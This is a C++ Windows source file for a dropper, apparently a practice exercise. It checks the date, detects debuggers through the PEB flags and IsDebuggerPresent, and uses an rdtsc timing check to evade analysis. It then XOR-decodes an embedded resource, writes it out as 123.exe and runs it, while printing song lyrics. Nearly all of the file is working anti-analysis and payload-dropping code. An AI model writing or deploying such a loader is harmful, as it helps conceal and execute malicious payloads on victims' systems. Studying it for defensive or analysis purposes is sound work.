// ConsoleApplication4.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <stdint.h>
#include <intrin.h>
#include "resource.h"
#include <string.h>

//#pragma instrinsic(__rdtsc);

LPSYSTEMTIME lpSystemTime;

LPSTARTUPINFOA startUpInfo = {0};
LPPROCESS_INFORMATION processInformation = {0};
LPCONTEXT ctx;

int main()
{
	(LPSYSTEMTIME)lpSystemTime = (LPSYSTEMTIME)malloc(sizeof(LPSYSTEMTIME));
	GetSystemTime(lpSystemTime);
	GetLocalTime(lpSystemTime);

	unsigned __int64 time1 = __rdtsc();
	printf("%#I64x\n", time1);

	if (lpSystemTime->wYear == 2019 && lpSystemTime->wDayOfWeek == 2)
		printf("\t\tYou Are My Sunshine!\n");
	else
	{
		printf("\t\tTime is enabled!\n");
		ExitProcess(-1);
	}

	int64_t _TEB;

	//printf("size of Integer: %d\n", sizeof(TEB));

	_TEB = (int64_t)__readgsqword(0x60); //Process Environment Block for 64 bit

	unsigned char* _PEB = (unsigned char*)_TEB;

	BOOL isBeingDebugged = _PEB[2];

	if (isBeingDebugged == 1)
	{
		printf("\tIsBeingDebugged is Enabled\n");
		ExitProcess(-2);
	}
	else
		printf("\tYou are my sunshine, my only sunshine\n");

	DWORD NTGlobalCheck = _PEB[0xbc];

	if (NTGlobalCheck == 0x70)
	{
		printf("\tNTGlobalCheck is Enabled\n");
		ExitProcess(-3);
	}
	else
		printf("\tYou make me happy, when skies are grey\n");

	if (IsDebuggerPresent())
	{
		printf("\tIsDebuggerPresent is present\n");
		ExitProcess(-4);
	}
	else
		printf("\tYou never know, dear, how much I love you\n");

	unsigned __int64 time2 = __rdtsc();

	//printf("%#I64x\n", time2);

	unsigned __int64 sub = time2 - time1;

	//printf("%#I64x\n", sub);

	if (sub < 0x400000)
		printf("\tPlease don't take my sunshine away\n");
	else
	{
		printf("Time based is enabled\n");
		ExitProcess(-5);
	}

	startUpInfo = (LPSTARTUPINFOA)malloc(sizeof(STARTUPINFOA));

	processInformation = (LPPROCESS_INFORMATION)malloc(sizeof(PROCESS_INFORMATION));

	ZeroMemory(startUpInfo, sizeof(STARTUPINFOA));
	ZeroMemory(processInformation, sizeof(PROCESS_INFORMATION));

	startUpInfo->cb = sizeof(STARTUPINFOA);
	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_RT_RCDATA1), "RT_RCDATA");

	char* dGlobal;

	dGlobal = (char *)LoadResource(NULL, hResource);

	int sizeResource = SizeofResource(NULL, hResource);

	char* lpBuffer = (char *)malloc(sizeResource);

	//printf("%s\n", dGlobal);

	void * lpVirtualAlloc = VirtualAlloc(NULL, sizeResource, MEM_COMMIT, NULL);

	memcpy(lpBuffer, dGlobal, sizeResource);

//	char * lpCmdline = "c:\\windows\\system32\\calc.exe";
//	CreateProcessA(NULL, lpCmdline, NULL, NULL, FALSE, 0, NULL, NULL, startUpInfo, processInformation);

	for (int i = 0; i<= sizeResource; i++)
	{
		lpBuffer[i] = lpBuffer[i] ^ 0x20;
	}

	HANDLE hFile = CreateFileA("123.exe", GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	
	DWORD dwBytesWritten;

	if(WriteFile(hFile, lpBuffer, sizeResource, &dwBytesWritten, NULL))
		printf("\tNumber of bytes written: %d\n", dwBytesWritten);

	CloseHandle(hFile);

	CreateProcessA(NULL, "123.exe", NULL, NULL, FALSE, 0, NULL, NULL, startUpInfo, processInformation);



	ExitProcess(0);
	//CloseHandle(processInformation->hProcess);

	//system("PAUSE");

	return 0;
}

